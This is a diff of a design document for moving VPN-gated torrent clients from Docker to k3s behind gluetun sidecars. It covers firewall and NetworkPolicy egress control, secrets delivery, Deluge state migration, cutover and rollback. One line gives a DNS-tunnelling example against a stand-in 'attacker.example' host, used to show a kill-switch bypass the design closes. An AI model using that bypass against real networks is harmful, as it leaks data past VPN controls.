@@ -1,12 +1,14 @@
 # VPN-gated stack on k3s — design, not a port
 
-**Status: DESIGN, nothing built.** Supersedes the "translate binhex faithfully" approach
+**Status: DESIGN v2, nothing built.** Supersedes the "translate binhex faithfully" approach
 for the three VPN-gated groups. Written 2026-08-08 after the owner redirected the work:
 *"move away from direct migration/preservation to how IT SHOULD be done… the goal is a
 port yes but also an improvement, not just a port for porting sake."* Breakage is to be
 avoided but is not fatal — fix forward.
 
-Read `K3S-HANDOFF.md` first for fleet conventions, the deploy discipline, and the traps.
+v1 was REJECTED in cross-review with 4 blockers. Every finding is folded in below, and the
+ones that were **my errors** are called out where they sit, because each is a trap someone
+could repeat. Read `K3S-HANDOFF.md` first for fleet conventions and the deploy discipline.
 
 ---
 
@@ -29,16 +31,16 @@ carries a literal MyAnonaMouse session cookie **in its argv**.
 | kill-switch | bespoke `init.sh` | maintained upstream, documented never to deactivate |
 | credentials | written to disk | **`*_SECRETFILE` for every one** |
 | iptables on NixOS | needs an entrypoint shim | works as shipped |
+| DNS | host resolvers | **own DoT resolver over the tunnel** |
 
-The improvement is not stylistic. Three concrete defects go away: the privileged
-container, the credential file on disk, and a hand-rolled kill-switch we would own
-forever. `qbittorrent-books` and `flaresolverr-books` already run as
-`NetworkMode=container:<gluetun>`, which is exactly a shared Pod netns — so this pattern
-is already load-bearing here, just under Docker.
+Three concrete defects go away: the privileged container, the credential file on disk, and
+a hand-rolled kill-switch we would own forever. `qbittorrent-books` and
+`flaresolverr-books` already run as `NetworkMode=container:<gluetun>`, which is exactly a
+shared Pod netns — the pattern is already load-bearing here, just under Docker.
 
 ⚠️ gluetun today sets `OPENVPN_USER`/`OPENVPN_PASSWORD` as **env**; the `*_SECRETFILE`
-variables are at their defaults and unused. The file-based path is available and simply
-has not been adopted. Adopting it is the single change that makes the secret goal real.
+variables are at their defaults and unused. Adopting the file path is the single change
+that makes the secret goal real.
 
 ---
 
@@ -46,261 +48,379 @@ has not been adopted. Adopting it is the single change that makes the secret goa
 
 ⛔ **Do not build one mega-Pod.** PIA's port-forward assigns **one port per connection**,
 and all containers in a Pod share one address and port space. Two torrent clients cannot
-both bind the same peer port, and one tunnel cannot supply two advertised ports. There are
-**three** torrent clients here, not two.
+both bind the same peer port. There are **three** torrent clients here, not two.
 
-| Pod | containers | notes |
+| Pod | containers | ingress today (Docker label ONLY) |
 |---|---|---|
-| `deluge-books` | gluetun sidecar + deluge + **MAM registrar** sidecar | MAM is books-only |
-| `deluge-vpn` | gluetun sidecar + deluge | its own tunnel and forwarded port |
-| `qbittorrent-books` | gluetun sidecar + qbittorrent + flaresolverr-books | preserves an already-working shared-egress group |
+| `deluge-books` | gluetun + deluge + **MAM registrar** | `btbooks.saldivar.io` → 8112 |
+| `deluge-vpn` | gluetun + deluge | `bt.saldivar.io` |
+| `qbittorrent-books` | gluetun + qbittorrent + flaresolverr | `books-dl.saldivar.io` → 8080 |
 
-flaresolverr needs no inbound peer port, so sharing is safe there. The Pod-count saving
-from further merging is not worth coupled upgrades, coupled restarts and a wider VPN
-blast radius.
+flaresolverr needs no inbound peer port, so sharing is safe there.
+
+❓ **Preflight before building**: prove PIA issues **three simultaneous** usable port
+forwards on this account. The three-Pod split is sound in principle, but capacity is
+unverified and it is cheap to test first.
 
 ---
 
-## The gluetun sidecar — and the correction that matters
+## Egress control — the part v1 got wrong
 
-gluetun runs as a **native sidecar**: an `initContainer` with `restartPolicy: Always`.
-k3s is v1.35.6, so this is GA.
+⛔ **v1 proposed allowing `10.42.0.0/16` and `10.43.0.0/16` in
+`FIREWALL_OUTBOUND_SUBNETS`. That was wrong in both directions and is rejected:**
+
+- **Unnecessary**: gluetun already ACCEPTs output to each *directly attached* subnet
+  before it applies configured outbound subnets. The node's Pod subnet is reachable
+  without the entry.
+- **Over-broad**: a `/16` permits reaching **every Pod on every node**, so any HTTP/SOCKS
+  relay anywhere in the cluster becomes a VPN bypass.
+- **Self-contradictory**: v1's acceptance simultaneously demanded "DNS fails when the
+  tunnel is down" and "cluster DNS works". With `10.43/16` allowed,
+  `dig @10.43.0.10 x.attacker.example` succeeds *through CoreDNS's own non-VPN egress*
+  while the tunnel is down — and DNS tunnelling carries arbitrary data. Both criteria
+  cannot hold.
+
+### The resolution: these Pods need no cluster egress at all
+
+gluetun runs its **own DNS server** (`DNS_SERVER=on`, DoT upstream, `DNS_UPSTREAM_IPV6=off`)
+and resolves **over the tunnel**. So the app containers must use gluetun's resolver, not
+CoreDNS, and therefore need nothing from `10.43/16`.
+
+- `FIREWALL_OUTBOUND_SUBNETS`: **empty**. Not the cluster CIDRs, not the LAN.
+- Inbound (prowlarr → deluge, traefik → UI, kubelet probes) is **input**, governed by
+  `FIREWALL_INPUT_PORTS` — not by outbound subnets. Declare each required port explicitly;
+  ⛔ a ClusterIP Service cannot override gluetun's firewall, so an undeclared port is a
+  silent 502.
+- ⛔ **Neutralise gluetun's automatic local-subnet allowance with a NetworkPolicy.** k3s
+  enforces NetworkPolicy by default (kube-router, in-process — no separate Pod, so its
+  absence from `kube-system` is expected, not evidence it is off). Default-deny egress for
+  these Pods, permitting only what the tunnel needs; allow ingress only from the specific
+  consumers. This is the piece that closes the same-node relay path, and it is the
+  idiomatic Kubernetes answer rather than a gluetun setting.
+
+⚠️ Verify NetworkPolicy is genuinely enforced with a positive **and** negative test before
+relying on it. An unenforced policy fails open and looks identical to a working one.
+
+### The control server
+
+⛔ **"Do not expose `:8000`" is NOT achieved by omitting a Service.** Pods reach Pod IPs
+directly. gluetun's control server can stop or reconfigure the VPN, so a compromised Pod
+reaching `10.42.x.y:8000` is a kill-switch bypass. Bind it to **loopback**
+(`HTTP_CONTROL_SERVER_ADDRESS=127.0.0.1:8000`) and configure least-privilege auth. The
+NetworkPolicy is the second layer, not the only one.
+
+---
+
+## The gluetun sidecar
+
+gluetun runs as a **native sidecar**: an `initContainer` with `restartPolicy: Always`
+(k3s v1.35.6, so GA).
 
 ⛔ **A native sidecar alone does NOT guarantee the firewall is up before the app starts.**
-Kubernetes proceeds to the next container once a restartable init container is merely
-*running* — unless it has a **passing `startupProbe`**. Without one, "gluetun starts
-first" is not "gluetun is ready first", and there is a real egress window. gluetun
-therefore gets an exec `startupProbe` bound to its own healthcheck, and a readiness probe
-that contributes to Pod readiness.
+Kubernetes proceeds once a restartable init container is merely *running* — unless it has
+a **passing `startupProbe`**. gluetun therefore gets an exec `startupProbe` on its own
+healthcheck, plus a readiness probe contributing to Pod readiness.
 
-Security context, stated precisely:
+⚠️ **That closes the INITIAL window only.** After startup succeeds, an independent gluetun
+restart does **not** stop Deluge — readiness merely removes Service endpoints, and
+already-running processes and established connections continue. **The firewall is the
+safety boundary; the probe is not.** This is why acceptance below is adversarial and
+continuous rather than a rule snapshot.
 
-- gluetun: `drop: [ALL]`, then `add: [NET_ADMIN]`. Test whether ICMP health checks pull in
-  a `NET_RAW` dependency; add it only if proven necessary.
-- app containers: `drop: [ALL]`, `allowPrivilegeEscalation: false`, `RuntimeDefault`
-  seccomp, **no** capabilities. They simply use the Pod netns.
-- ⛔ Omitting `capabilities.add` does **not** mean "no capabilities" — the runtime's
-  default set remains. `drop: [ALL]` is the only thing that empties it.
-- `/dev/net/tun` as a `hostPath` `type: CharDevice` (present on the node as
-  `crw-rw-rw- 10,200`).
-- `automountServiceAccountToken: false`; every image **digest-pinned**.
+### Restart semantics
 
-### Restart semantics — why this is fail-closed, and where it is not
+Containers share the netns; the sandbox outlives any individual container. Netfilter rules
+are **namespace** state, not process state. So if gluetun crashes while the sandbox lives,
+its DROP rules remain and the vanished tunnel leaves the apps fail-closed. If the sandbox
+is replaced, the apps go with it and gluetun starts first in the new one. The dangerous
+moment is the **transition**, when a replacement gluetun mutates or restores rules.
 
-Containers in a Pod share the netns; the sandbox outlives any individual container.
-Netfilter rules are **namespace** state, not process state. So if gluetun crashes while
-the sandbox lives, its DROP rules remain and the vanished tunnel leaves the apps
-fail-closed. If the sandbox is replaced, the app containers go with it and gluetun starts
-first in the new one.
+### Capabilities — a test matrix, not an assertion
 
-⚠️ This is not a zero-window proof and must not be written up as one. Readiness going
-false does not stop already-running processes or established connections — **the firewall
-is the safety boundary, not the probe.** That is why the acceptance test below is
-adversarial rather than confirmatory.
+⛔ v1 asserted `drop: [ALL]` for the app containers. **Unproven and probably wrong**:
+binhex images do PUID/PGID `chown` work at startup, and gluetun's public-IP writer chowns
+too, so `CHOWN`/`SETUID`/`SETGID` are likely required. Checking only for `NET_RAW` was
+insufficient.
 
-### Firewall scope — a real trade, made deliberately
+Determine empirically against the exact pinned digests, adding only the proven minimum:
 
-gluetun today uses `FIREWALL_OUTBOUND_SUBNETS=172.16.0.0/12,192.168.0.0/16` — already
-tighter than binhex's `LAN_NETWORK=10.0.0.0/8`. On k3s the Pod needs cluster DNS and
-Service reachability, so the cluster ranges (`10.42.0.0/16` pods, `10.43.0.0/16` services)
-must be allowed outside the tunnel.
+| container | start from | likely additions to test |
+|---|---|---|
+| gluetun | `drop: [ALL]` + `NET_ADMIN` | `NET_RAW` (ICMP health), `CHOWN` (public-IP writer) |
+| deluge / qbittorrent | `drop: [ALL]` | `CHOWN`, `SETUID`, `SETGID` (PUID/PGID init) |
+| flaresolverr, registrar | `drop: [ALL]` | expected none |
 
-⛔ **Do not port the broad `10/8` allowance.** It would permit escape via another Pod or a
-node process. Allow the two cluster CIDRs and nothing more, and state plainly that this is
-*narrower than today but not zero* — a VPN-gated Pod on Kubernetes cannot function with no
-non-tunnel egress at all.
+Also: `allowPrivilegeEscalation: false`, `RuntimeDefault` seccomp, `/dev/net/tun` as
+`hostPath` `type: CharDevice`, `automountServiceAccountToken: false`, every image
+**digest-pinned**.
 
 ---
 
-## Secrets — what is actually being promised
+## Manifest invariants — required, and absent from v1
+
+⛔ v1 omitted these. Without them a routine update runs **two Deluge processes on one
+hostPath**, or a Pod lands on pelargir and presents empty state:
+
+- `nodeSelector: kubernetes.io/hostname: minas-tirith` — hostPaths are local to minas.
+- `strategy: Recreate` — never two writers on one state tree.
+- Typed hostPaths: `type: Directory` (⛔ the default **creates** a missing path, turning a
+  typo into an empty config and a "fresh" client), `/dev/net/tun` as `CharDevice`.
+- `enableServiceLinks: false`, `terminationGracePeriodSeconds` sized for a clean Deluge
+  shutdown, explicit `resources`, and application-specific readiness (not TCP-only).
+- Declared replica counts matching reality — this repo has been bitten by manifests saying
+  `replicas: 0` while running at 1.
+
+---
+
+## Secrets
 
 Delivery: sops → rendered to tmpfs on pelargir → applied by `k3s-apply-secrets` → mounted
 as a **Secret volume** → consumed via gluetun's `*_SECRETFILE` variables.
 
-- ⛔ **Not `secretKeyRef`.** Resolved env values reach containerd's on-disk container
-  metadata, which defeats the point. Secret volumes are tmpfs-backed.
-- ⛔ **Mount the whole Secret directory — never `subPath`.** subPath mounts do not receive
-  updates, so a rotation would appear to succeed and change nothing.
-- Repo-wide, `secretKeyRef` is used only by `tracearr.yaml` and `palworld.yaml`. Convert
-  both when those workloads are next touched — not as a separate campaign.
+- ⛔ **Not `secretKeyRef`** — resolved env reaches containerd's on-disk metadata.
+- ⛔ **Mount the whole Secret directory — never `subPath`**, which never receives updates,
+  so a rotation would appear to succeed and change nothing.
+- Repo-wide `secretKeyRef` remains only in `tracearr.yaml` and `palworld.yaml`; convert
+  when those are next touched, not as a campaign.
 
-### State the guarantee honestly
+### The guarantee, stated so it is actually true
 
-Secret **volumes stop the injected copy from reaching node storage. They do not stop an
-application from persisting credentials into its own hostPath config, logs or state**, and
-private-tracker `.torrent` files carry announce tokens regardless. "No plaintext
-credential anywhere on disk" is **not achievable** by changing secret delivery; it needs
-encrypted datasets (`storage2` is `encryption=off`, and ZFS encryption is creation-time
-only).
+⛔ v1 claimed "deployment secrets are never materialized into persistent runtime metadata
+or manifests." **Still overclaiming**: the Secret is a persistent API object in the k3s
+datastore, and a client-side `kubectl apply` can persist the submitted content in the
+last-applied annotation.
 
-✅ The achievable, verifiable guarantee is: **deployment secrets are never materialized
-into persistent runtime metadata or manifests.** Claim that, prove that, and track
-storage encryption as separate work.
+✅ Accurate: **plaintext deployment values are not written by this delivery path into Git,
+the auto-deploy directory, containerd metadata, or unencrypted node files.** An API reader
+can still retrieve the Secret, applications still persist their own credentials into
+hostPath config and logs, and `.torrent` files carry tracker announce tokens regardless.
+"No plaintext anywhere on disk" needs encrypted datasets (`storage2` is `encryption=off`,
+and ZFS encryption is creation-time only) and is tracked as separate work.
 
 ### Rotation is one transaction
 
 ⛔ `k3s-apply-secrets` does not react to value-only sops rotations, and applying a changed
-Secret does **not** restart gluetun, which reads credentials at startup. A rotation that
-stops halfway leaves the old credential live while looking done. The transaction is:
-apply Secret → confirm resourceVersion changed → recreate affected Pods **one at a time**
-→ prove tunnel up and exit IP non-local between each.
+Secret does **not** restart gluetun, which reads credentials at startup. A half-done
+rotation leaves the old credential live while looking complete:
+
+`sops edit` → `systemctl restart k3s-apply-secrets` (**explicitly required**) → confirm
+the Secret's `resourceVersion` changed → recreate affected Pods **one at a time** → prove
+tunnel up and exit IP non-local between each.
 
 ---
 
-## The MAM registrar — a sidecar, not a hook
+## The MAM registrar
 
 MAM sessions are **IP-bound**. Today a literal `mam_id=` cookie in argv calls
 `/json/dynamicSeedbox.php` after the tunnel comes up. Dropping it breaks MAM **not at
 cutover but at the next exit-IP change** — silently, and looking unrelated.
 
-⛔ **Do not use gluetun's port-forward up/down hook for this.** It fires on "port
-forwarding established", not "exit IP changed", so registration would stop silently if
-forwarding failed while egress stayed usable. Use the port-forward hook for its actual
-job: updating each torrent client's listening port.
+⛔ **Do not use gluetun's port-forward hook for this.** It fires on "port forwarding
+established", not "exit IP changed", so registration would stop silently if forwarding
+failed while egress stayed usable.
 
-The registrar is a small sidecar that:
+The registrar is a **native sidecar ordered after gluetun** — ⛔ v1 said "sidecar" without
+specifying, and on an ordinary application sidecar a startup probe gates only Pod readiness
+while Deluge starts concurrently, so the intended gate would not exist. It:
 
-- mounts **only** the MAM Secret;
-- watches gluetun's `PUBLICIP_FILE` (`/tmp/gluetun/ip`) via a shared **memory-backed**
-  `emptyDir`, and registers on every observed change, with bounded backoff;
-- has a `startupProbe` that succeeds only after the first successful registration, so
-  Deluge cannot start before MAM is usable;
-- performs the HTTP **itself**, so the cookie never appears in a child argv or a log.
+- mounts **only** the MAM Secret, and performs the HTTP **itself** so the cookie never
+  reaches a child argv or a log;
+- watches gluetun's `PUBLICIP_FILE` (`/tmp/gluetun/ip`) through a shared **memory-backed**
+  `emptyDir`. ⛔ gluetun **truncates that file to empty on disconnect and rewrites it
+  non-atomically** — so parse defensively and ignore empty/partial reads, or the registrar
+  will submit garbage transitions;
+- persists a **current-IP success marker** so backoff survives its own restart. ⛔ A finite
+  failed startup probe restarts the container and would otherwise reset process-local
+  backoff, turning a MAM outage into a restart loop that pounds MAM while Deluge never
+  starts;
+- gates Deluge on first successful registration via `startupProbe`.
 
 ❓ MAM's retry/rate-limit behaviour is unknown and must be measured before fixing the poll
-interval.
+interval and backoff ceiling.
+
+### Forwarded-port updates
+
+⛔ gluetun's port-forward hook can fire **before** the gated torrent container is
+listening; that single update fails and may not retry until the next reconnect, leaving
+the client announcing a stale port indefinitely while its UI looks healthy. Use a
+**retrying watcher** with a current-port readiness gate, not a one-shot hook.
 
 ---
 
-## Deluge state — preserve it, and never let the new image touch the rollback
+## Deluge state — the procedure v1 got wrong
 
-Measured in the live container: **Deluge 2.1.1, libtorrent 2.0.10.0**, Python 3.13.1,
-**47 torrents**, `state/torrents.state` present, tree owned `1000:1000` (so LinuxServer
-`PUID/PGID=1000` maps directly).
+Measured live: **Deluge 2.1.1, libtorrent 2.0.10.0**, Python 3.13.1, **47 torrents**,
+`state/torrents.state` present, tree owned `1000:1000`.
 
-⛔ **A clean re-add is the fallback, not the plan.** It forces a full hash check of every
-torrent and discards queue order, pause state, labels, file priorities, ratios and seeding
-history even though the payload survives.
+⛔ **v1's ordering destroyed the thing it was preserving.** It said *"Pause everything;
+record … queue state"* — recording **after** pausing means the record and the copy both
+say all 47 torrents are paused, and that is how they come back. v1 also said "complete
+tree" and then gave a whitelist that omitted root-level plugin config while separately
+claiming labels survive.
 
-Procedure:
+Corrected procedure:
 
-1. Pause everything; record torrent count, infohashes, save paths, queue state.
-2. Stop the container. Copy the **complete** stopped tree to a **new** host directory with
-   numeric ownership and metadata preserved (`cp -a`), leaving the binhex tree untouched
-   as the rollback artifact.
-3. Copy: `core.conf`, `web.conf`, `auth`, `hostlist.conf`, `session.state`, `icons/`,
-   `ssl/`, `plugins/`, and the **entire** `state/` tree — `torrents.state`, fast-resume
-   data and all 47 `.torrent` files. Copying only `core.conf` + `.torrent` files loses
-   everything in the paragraph above.
-4. **Exclude** the binhex-specific artifacts: `openvpn/`, `privoxy/`, `perms.txt`,
-   `supervisord.log*`, `deluged.pid`.
-5. Preserve the **exact in-container download paths** initially. Deluge stores absolute
-   paths in state; changing them and the orchestrator at once makes a failure ambiguous.
+1. **Record identity FIRST, before touching anything**: torrent count, infohashes, save
+   paths, queue order, **and per-torrent paused/active state**.
+2. Pause everything, then stop the container cleanly.
+3. Copy the **entire tree** in one unambiguous command with explicit exclusions —
+   preserving numeric ownership and metadata — into a **new** directory, leaving the
+   binhex tree untouched as the rollback artifact.
+   - ⛔ **Exclude** `openvpn/` (⚠️ never copy `credentials.conf` into the new tree),
+     `privoxy/`, `perms.txt`, `supervisord.log*`, `deluged.pid`.
+   - Everything else comes across, including root-level plugin configuration
+     (`label.conf`, `execute.conf`, `scheduler.conf`, …) that a whitelist would drop and
+     that carries the label mappings.
+4. Preserve the **exact in-container download paths** initially — Deluge stores absolute
+   paths in state, and that variable is separable from the image.
+
+⛔ **A clean re-add is the fallback, not the plan** — it forces a full hash check and
+discards queue order, pause state, labels, priorities, ratios and seeding history.
 
 ### Image choice — DECIDED: upgrade in the same move, deliberately
 
-Measured against the registry: **no replacement image exists at Deluge 2.1.1.** Both
-`linuxserver/deluge` and binhex's own non-VPN `binhex/arch-deluge` start at **2.2.0**.
-
-An earlier draft proposed keeping the running `arch-delugevpn` image with `VPN_ENABLED=no`
-(supported — `init.sh:119` branches on it) to hold the application at 2.1.1 and upgrade
-later. **Rejected by the owner, correctly:** it carries the VPN bundle forever to avoid a
-risk that this design already neutralises.
+No replacement image exists at Deluge 2.1.1; both `linuxserver/deluge` and binhex's
+non-VPN `binhex/arch-deluge` start at **2.2.0**. An earlier draft proposed running the
+current VPN image with `VPN_ENABLED=no` (supported — `init.sh:119`) to hold the version.
+**Rejected by the owner, correctly:** it carries the VPN bundle forever to avoid a risk
+this design already neutralises.
 
 ✅ **`binhex/arch-deluge`, digest-pinned to
-`sha256:503ac5b44839bd2967ed4f4d9cf3349eda0d5fc2d7f51b360b49f0aaed3d1298`** — which is
-what both `2.2.0-2-02` and `latest` resolve to today.
+`sha256:503ac5b44839bd2967ed4f4d9cf3349eda0d5fc2d7f51b360b49f0aaed3d1298`** — what both
+`2.2.0-2-02` and `latest` resolve to today.
 
-Why this is safe rather than reckless:
+- **The rollback tree is never opened**, so a forward `core.conf` migration cannot make
+  rollback one-way. That is what makes upgrading in the same move affordable.
+- **Same image family** — the state was written by binhex's Deluge, so binhex→binhex
+  changes only the version, not the conventions. LinuxServer would change family *and*
+  version: the real two-variable problem.
+- ⛔ **Default tag track only.** The `-libtorrentv1` variants are libtorrent 1.x and would
+  invalidate all 47 torrents' resume data.
+- ⛔ **Pin the digest, never the tag.**
 
-- **The rollback tree is never opened.** State is copied to a *new* directory and the
-  binhex tree is left untouched, so 2.2.0 migrating `core.conf` forward cannot make the
-  rollback one-way. That protection is what makes upgrading in the same move affordable.
-- **The real compatibility boundary is libtorrent, not Deluge.** Fast-resume data is
-  libtorrent's format, and both images are libtorrent **2.x**. ⛔ Take the DEFAULT tag
-  track — the `-libtorrentv1` variants are libtorrent 1.x and **would** invalidate all 47
-  torrents' resume data.
-- **Same image family.** The state tree was written by binhex's Deluge; staying
-  binhex→binhex changes only the version and drops the VPN bundle. LinuxServer would
-  change image family *and* version at once — that is the genuine two-variable problem,
-  not the version bump by itself.
-- ⛔ **Pin the digest, never the tag.** `latest` is mutable; on a torrent client a silent
-  re-pull could change libtorrent underneath live resume data.
+### Compatibility gate — prove it offline, on a THIRD copy
 
-⛔ Still do **not** change download paths in the same move. Deluge stores absolute paths in
-state, and that variable is separable from the image — keep it fixed.
+⛔ v1 treated "2.1.1 + libtorrent 2.0.x" as a compatibility proof. It is not: resume
+compatibility is directional and format-version dependent, and v1 ignored Python and
+plugin compatibility entirely.
 
----
+Before selecting the digest, start the candidate **offline against a third throwaway
+copy** and prove: all 47 torrents present with matching infohashes, save paths intact,
+queue and paused/active state preserved, plugins load, and **zero rechecks**. A mass hash
+check costs hours of I/O and seeding ratio, and no rollback undoes it once started.
 
-## Networking and ingress
+### ⛔ The other two groups need the same treatment
 
-- Expose only Web/API ports through **ClusterIP Services**.
-- ⛔ The PIA-forwarded **peer port arrives through `tun0`** and needs no `hostPort`,
-  NodePort or ingress route. Do not translate it into one.
-- ⛔ **Do not expose gluetun's control API** (`:8000`).
-- `btbooks.saldivar.io` exists **only as a Docker label today**. Stopping Docker deletes
-  the router. A `traefik-routes.nix` backend for the new Service is required in the
-  cutover commit or public ingress 404s.
-- The bridge `deluge-books` Service in `docker-bridges.yaml` is consumed by prowlarr.
-  Replacing it is a delete-and-recreate across two AddOns; pin the existing ClusterIP and
-  **explicitly delete the `deluge-books-docker` EndpointSlice**, or kube-proxy will
-  advertise the dead Docker endpoint alongside the Pod.
+v1 designed state handling only for `deluge-books`. `deluge-vpn` and `qbittorrent-books`
+also have config hostPaths, and without a stopped copy, identity baseline, compatibility
+gate and rollback artifact each, the first start of a new image can rewrite the only state
+tree they have.
 
 ---
 
-## Acceptance — adversarial, because confirmatory proves nothing
+## Cutover surface
+
+### ⛔ AddOn filenames must sort AFTER the current bridge owners
+
+k3s auto-deploy applies in filename order, and dropping a manifest never prunes. The
+natural names are **unsafe**: `minas-deluge-*.yaml` sorts before `minas-docker-bridges.yaml`
+(which owns `deluge-books`, `deluge-books-docker`, `deluge-vpn`, `deluge-vpn-docker`), and
+`minas-qbittorrent-books.yaml` sorts before `minas-readmeabook.yaml` (which owns the
+`gluetun` Service). The new Pods would come up healthy and then have their Services pruned
+by the later-applying old owner.
+
+✅ Use a **`minas-vpn-*.yaml`** prefix — sorts after both `minas-docker-bridges.yaml` and
+`minas-readmeabook.yaml`. Record the reason next to the filenames so nobody "tidies" them.
+
+### Services, endpoints, ingress
+
+- Pin **all three** existing ClusterIPs, not only `deluge-books`.
+- ⛔ Explicitly delete **every** stale EndpointSlice — `deluge-books-docker` **and**
+  `deluge-vpn-docker` — or kube-proxy load-balances onto a dead Docker endpoint.
+- Take over the **`gluetun` Service in `readmeabook.yaml`**, which readmeabook uses as its
+  download client.
+- All three hostnames exist **only as Docker labels** and vanish when Docker stops:
+  `btbooks.saldivar.io`, `bt.saldivar.io`, `books-dl.saldivar.io`. Each needs a
+  `traefik-routes.nix` backend (`hosts = [ … ]` style) in the cutover commit or public
+  ingress 404s.
+- ⛔ The PIA-forwarded **peer port arrives through `tun0`** — no `hostPort`, NodePort or
+  ingress route.
+- Update the Docker synthetic bridge probes in `monitoring.nix` in the **same** cutover, or
+  they permanently report dead bridges.
+
+---
+
+## Acceptance — adversarial and continuous
 
 ⛔ `ip link set tun0 down` is **not** a fair test: OpenVPN is still alive and can recreate
-the interface before the probe runs. Against the pinned gluetun digest, prove:
+the interface. ⛔ Nor is a rule snapshot: rules can be correct at both ends of a
+transition that leaked in the middle.
+
+Against the exact pinned digests, **generating traffic continuously throughout**:
 
 1. Exit IP is a PIA address, not `99.64.240.101`, from inside the app container.
-2. **Kill the gluetun/OpenVPN process** (and separately, blackhole its endpoint IPs) and
-   confirm new TCP **and** UDP **and** DNS flows fail — continuously attempted, not
-   sampled once.
-3. **IPv6 fail-closed.** Attempt IPv6 TCP/UDP/DNS egress with the tunnel down. Today Pods
-   have link-local IPv6 only; a later global route must not become a bypass.
-4. **Same-node adversarial Pod**: attempt to relay traffic via another Pod on minas and
-   via the node itself. Probing only public `1.1.1.1` will pass while a relay path exists.
-5. Cluster DNS and Service access still work; ingress works same-node and cross-node.
-6. Rule and route snapshots **before, during and after** a gluetun restart, plus a Pod
-   recreation and a node reboot.
-7. Deluge: all 47 torrents present, correct queue/pause state, **no mass hash check**.
+2. Four distinct failure modes, each with continuous new-flow attempts across **IPv4 and
+   IPv6, TCP, UDP and DNS**: gluetun PID-1 termination; graceful sidecar restart; internal
+   OpenVPN restart; endpoint blackholing. Nothing may egress in any of them.
+3. **DNS specifically**: with the tunnel down, `dig @10.43.0.10` must fail. If it
+   succeeds, the CoreDNS bypass is live and the design is not implemented.
+4. **Relay Pods on BOTH nodes** — minas *and* pelargir — plus the node itself. Probing
+   only public `1.1.1.1` passes while a relay path exists.
+5. NetworkPolicy proven with a positive **and** negative test.
+6. gluetun control server unreachable from another Pod.
+7. Ingress works for all three hostnames, same-node and cross-node; prowlarr and
+   readmeabook still reach their download clients.
+8. Pod recreation and a **node reboot**, re-running 2–4 afterwards.
+9. Deluge: 47 torrents, matching infohashes, correct queue and **paused/active** state,
+   plugins loaded, **no mass hash check**.
 
 ---
 
-## Rollback
+## Rollback — exact, because the vague version is unsafe
 
-Docker's volumes and the binhex `/config` tree are untouched, and `deluge-books` still
-exists in compose (profiled out). Rollback is: remove the manifest from pelargir, rebuild,
-confirm no Pod remains, then `docker compose --profile migrated up -d deluge-books`.
-⛔ Neutralise Kubernetes **first** — two Deluge processes on one state tree is how the
-torrent state is lost.
+⛔ v1 said "remove the manifest from pelargir, rebuild, confirm no Pod remains". **That
+does not roll back.** Removing an entry from `manifests.nix` neither deletes the
+auto-deploy file nor the Kubernetes objects, so Docker would start while a live Pod still
+manages the same torrent payloads — two writers on one state tree.
+
+Per group, in this order:
+
+1. Remove the entry from `manifests.nix` **and** delete the `minas-vpn-*.yaml` file from
+   pelargir's auto-deploy directory; rebuild pelargir.
+2. **Explicitly delete the Kubernetes objects** — Deployment, Services, EndpointSlices,
+   NetworkPolicy — and confirm no Pod and no process remains.
+3. Restore the bridge Service ownership to its original AddOn and confirm the ClusterIP
+   and EndpointSlice are back.
+4. Revert the `traefik-routes.nix` entries and `monitoring.nix` probes.
+5. Only then `docker compose --profile migrated up -d <service>`.
+
+⛔ Neutralise Kubernetes **first**, every time.
 
 ---
 
 ## Explicitly NOT changing
 
-- The 20 already-migrated services. hostPath is correct for this fleet: the data exists
-  only on minas and there is no HA. Rewriting working media services onto PVCs would add
-  migration risk without adding availability.
-- readmeabook and tracearr bundling app + Postgres + Redis. Inelegant but upstream-defined;
-  decomposing them is an application rewrite with restore risk.
+- The 20 already-migrated services. hostPath is correct here: the data exists only on
+  minas and there is no HA. Rewriting working media services onto PVCs would add migration
+  risk without adding availability.
+- readmeabook and tracearr bundling app + Postgres + Redis — upstream-defined; decomposing
+  them is an application rewrite with restore risk.
 - `traefik-routes.nix` as the route source — a justified transitional exception while
-  Docker Traefik is still the host-owned edge. Application routes should become Kubernetes
-  Ingress objects **after** traefik itself migrates, not before.
-- hostPorts generally. `flaresolverr:8191` and `tracearr:3069` look redundant behind
-  internal Services and should be dropped when those workloads are next touched, but the
-  `*arr` hostPorts must not be removed without checking LAN clients and saved integrations.
+  Docker Traefik is the host-owned edge. Routes become Kubernetes Ingress **after** traefik
+  itself migrates.
+- hostPorts generally. `flaresolverr:8191` and `tracearr:3069` look redundant and should go
+  when those workloads are next touched, but the `*arr` hostPorts must not be removed
+  without checking LAN clients and saved integrations.
 
 ## Open questions carried into build
 
-1. ~~Does a Deluge image exist at 2.1.1 + libtorrent 2.0.x?~~ **ANSWERED: no.** Decided to
-   upgrade to `binhex/arch-deluge` 2.2.0 in the same move — see the image section above.
-   Verify at build that its `/config` layout and PUID/PGID handling match the tree being
-   copied (same author, so expected, but confirm rather than assume).
-2. MAM registration retry/rate-limit semantics — sets the poll interval.
-3. PIA simultaneous-connection limit — three gluetun tunnels plus any existing use.
-4. Does gluetun need `NET_RAW` for ICMP health checks under `drop: [ALL]`?
-5. Does Deluge 2.2.0 read 2.1.1's `torrents.state` without a rehash? Prove on the COPY
-   before the cutover — this is now the one place the version bump could still cost hours
-   of disk I/O and seeding ratio, and it is cheap to test in advance.
+1. ~~Does a Deluge image exist at 2.1.1?~~ **ANSWERED: no.** Upgrading to
+   `binhex/arch-deluge` 2.2.0 deliberately; verify its `/config` layout and PUID/PGID
+   handling match the copied tree.
+2. MAM registration retry/rate-limit semantics — sets poll interval and backoff ceiling.
+3. **PIA simultaneous-connection capacity — preflight three usable forwards before
+   building**, since the three-Pod split depends on it.
+4. Minimum capability set per container (table above) — measure, do not assume.
+5. Does Deluge 2.2.0 read 2.1.1's `torrents.state` without a rehash? Prove offline on the
+   third copy before cutover.
+6. Is NetworkPolicy genuinely enforced on this cluster? Positive **and** negative test.
